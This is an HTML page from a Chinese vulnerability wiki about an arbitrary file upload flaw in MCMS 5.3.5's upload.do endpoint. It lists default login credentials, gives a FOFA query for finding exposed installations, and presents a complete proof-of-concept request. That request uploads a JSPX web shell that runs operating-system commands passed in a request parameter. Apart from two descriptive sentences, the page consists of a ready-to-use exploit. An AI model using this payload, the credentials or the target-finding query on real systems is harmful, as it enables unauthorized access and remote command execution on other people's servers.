<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%AD%E9%A3%9E/%E9%93%AD%E9%A3%9EMCMS%E6%8E%A5%E5%8F%A3upload.do%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>铭飞MCMS接口upload.do存在任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u94ed\u98deMCMS\u63a5\u53e3upload.do\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
          ]},
          {title: "fofa", url: "#fofa", children: [
          ]},
          {title: "poc", url: "#poc", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/" class="btn btn-xs btn-link">
        银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E9%93%AD%E9%A3%9ECMS-search%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E9%93%AD%E9%A3%9ECMS-search%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        铭飞CMS search接口存在sql注入漏洞
      </a>
    </div>
    
  </div>

    

    <h2 id="mcmsuploaddo">铭飞MCMS接口upload.do存在任意文件上传漏洞<a class="headerlink" href="#mcmsuploaddo" title="Permanent link">&para;</a></h2>
<p>MCMS 5.3.5 存在允许在某些页面上传任意文件的漏洞。由于缺乏对文件扩展名的严格过滤，攻击者可以利用后端上传点上传任意文件。</p>
<p>默认凭据“msopen/msopen”可用于登录。</p>
<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>body=&quot;铭飞MCMS&quot; || body=&quot;/mdiy/formData/save.do&quot; || body=&quot;static/plugins/ms/1.0.0/ms.js&quot;
</code></pre></div>
<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /ms/file/upload.do HTTP/1.1</span>
<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">127.0.0.1:8000</span>
<span class="nt">Content-Length</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1519</span>
<span class="nt">sec-ch-ua</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Chromium&quot;</span><span class="l l-Scalar l-Scalar-Plain">;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span>
<span class="nt">sec-ch-ua-mobile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">?0</span>
<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span>
<span class="nt">sec-ch-ua-platform</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Windows&quot;</span>
<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">multipart/form-data; boundary=----WebKitFormBoundaryv6padqmOBvzQrGNY</span>
<span class="nt">Accept</span><span class="p">:</span><span class="w"> </span><span class="err">*</span><span class="l l-Scalar l-Scalar-Plain">/*</span>
<span class="nt">Origin</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">http://127.0.0.1:8000</span>
<span class="nt">Sec-Fetch-Site</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">same-origin</span>
<span class="nt">Sec-Fetch-Mode</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cors</span>
<span class="nt">Sec-Fetch-Dest</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">empty</span>
<span class="nt">Referer</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">http://127.0.0.1:8000/ms/basic/app/app.do?</span>
<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip, deflate</span>
<span class="nt">Accept-Language</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zh-CN,zh;q=0.9</span>
<span class="nt">Cookie</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pageno_cookie=1; JSESSIONID=B74AEB30E5118633728E8C63A8023F89; SHIRO_SESSION_ID=d9448adc-22d7-4095-aaf0-cdfc665ccc5b; rememberMe=FfWkNMTRTmfv1PftgMqyQaHPMttkHQFgN4hrBdSBgY+SBj+GBtgVfmt4hT6Wp8eJ96WEBXqu4QzVPA7bvZ0Ft8uYwiqLu/Wd04wBn2q+N2tUK03q6Jj2HKH6J5uksbNYz+6JDZ7Jjjc3eHQEvjZPDL5UO4onrpP+GKeIqAl4BFGeDcLhzmmp7FoskPySoN8YqQhrRETw+FxgYy4U+G9ZK7Kz4cjL5s1lyRPkJvHVolp92X7X6po2s8JQCUUgZKYqvcYgFfsJL1OMteOslPAnzCZ4T25yjPvVI+vTk65+8T6NfSgMsVc/MS0yQRbBNQIDTuqD6z5aaMbMbUcYNIrBp25aa43yNuyPXw8hrV+sdZwNGSYmkuuGd54cZTGopcGJ7/ITRlWhp6N0MHA6rkHAO0YDxZ4ZKQdnvRy+tLzQ0Zihmb3EBp0akH1BHb2m4zJ44sGsfriB5p1zyIWzqrA9RzlaHHgy8CJ9uagYZ85FBOxuf0Vgb9e+cD9Uc6HpxMZF43tgwUEJ4D9gY9NyDOxSbbvxBcry4FikPzy4QmMGrTdD2fx7Y6nOTFFhcoEZ+aNjfYRXJdnKPD7vxlSZwzouiNZZR4R3fbeHu2g1+hprtYPxWOs4dzp13NGgEqpy6gzBcwzhth9qFz3SigaXTcJI/W4I765krHUFipNRDF7oGB6EY6gHRXabdQMTTOPgHCnHssQZ80s1jtJfrJFSLvTutE0GOtrLG4TxNiKNF/c+BMIlIF+foFrPWSD1EfvvWj7uzdIX9NvUEaI+GYUOPjrND+0Vw3aNRn0Za4lMf/HQ1VPX0eUI0nNPMsr6DKN69HaYje8iVkSlKkR3oqqlJpCmbI53BWW2PdNLUsGYy7T9PSpMHYe1gaoPQTEPFO7XdSzx7bsZwzvOZ0yjpkU76DTSgPEswlrRiAlN70W4/eDCNe9llsQoMkmN2BRE4Cvh37vQ8zBBUQvnosPZB0svn2i/UMhZEWIELmbFAhQ7F4uh4rVo0zpEDpY0kB9gv4f/HIHJIX7N2gedp2bbK1tVBeJ2cvUNPRcVdrjpK0F/KOZCPwBihRngv7fcuVmcCCddd9crYWXeiw7xOmIYH/Lvu5/cYPcNCz6I22L9WgxUzMZ1LSE2iVKKUADSmJ/EiL7UiApSReAZQPpkIMZHxMvCVXb0Xh9QegeJiCFY3F9W+FGdTMiBJeQa9zXw+ocSvgLcLirR4pBc3pJgnwpg9o3kRk2a0nmZ7w187CwsDswdLnt0ddN/2Yrni9R3kArSgvM/Q7yS/nO3JmUDiqehKep8IxkJlR+8KYFobspGMr+YLPom0ut7h/Stf5FvYxYbGNXNmGVuC+jBsODMNpHE5mQ=</span>
<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">close</span>

<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundaryv6padqmOBvzQrGNY</span>
<span class="nt">Content-Disposition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">form-data; name=&quot;uploadPath&quot;</span>

<span class="l l-Scalar l-Scalar-Plain">html/web</span>
<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundaryv6padqmOBvzQrGNY</span>
<span class="nt">Content-Disposition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">form-data; name=&quot;rename&quot;</span>

<span class="l l-Scalar l-Scalar-Plain">false</span>
<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundaryv6padqmOBvzQrGNY</span>
<span class="nt">Content-Disposition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">form-data; name=&quot;appId&quot;</span>

<span class="l l-Scalar l-Scalar-Plain">false</span>
<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundaryv6padqmOBvzQrGNY</span>
<span class="nt">Content-Disposition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">form-data; name=&quot;uploadFolderPath&quot;</span>

<span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundaryv6padqmOBvzQrGNY</span>
<span class="nt">Content-Disposition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">form-data; name=&quot;file&quot;; filename=&quot;1.jspx.&quot;</span>
<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">text/plain</span>

<span class="l l-Scalar l-Scalar-Plain">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot;</span>
<span class="w">          </span><span class="l l-Scalar l-Scalar-Plain">xmlns=&quot;http://www.w3.org/1999/xhtml&quot;</span>
<span class="w">          </span><span class="l l-Scalar l-Scalar-Plain">xmlns:c=&quot;http://java.sun.com/jsp/jstl/core&quot; version=&quot;1.2&quot;&gt;</span>
<span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">&lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;gb2312&quot;/&gt;</span>
<span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">&lt;jsp:directive.page import=&quot;java.io.*&quot;/&gt;</span>

<span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">&lt;html&gt;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;head&gt;</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">&lt;title&gt;jspx&lt;/title&gt;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;/head&gt;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;body&gt;</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">&lt;jsp:scriptlet&gt;</span>
<span class="w">               </span><span class="l l-Scalar l-Scalar-Plain">try {</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">String cmd = request.getParameter(&quot;paxmac&quot;);</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">if (cmd !=null){</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">Process child = Runtime.getRuntime().exec(cmd);</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">InputStream in = child.getInputStream();</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">int c;</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">while ((c = in.read()) != -1) {</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">out.print((char)c);</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">}</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">in.close();</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">try {</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">child.waitFor();</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">} catch (InterruptedException e) {</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">e.printStackTrace();</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">}</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">}</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">} catch (IOException e) {</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">System.err.println(e);</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">}</span>
<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">&lt;/jsp:scriptlet&gt;</span>
<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;/body&gt;</span>
<span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">&lt;/html&gt;</span>
<span class="l l-Scalar l-Scalar-Plain">&lt;/jsp:root&gt;</span>
<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundaryv6padqmOBvzQrGNY--</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/" class="btn btn-xs btn-link">
        银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E9%93%AD%E9%A3%9ECMS-search%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E9%93%AD%E9%A3%9ECMS-search%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        铭飞CMS search接口存在sql注入漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>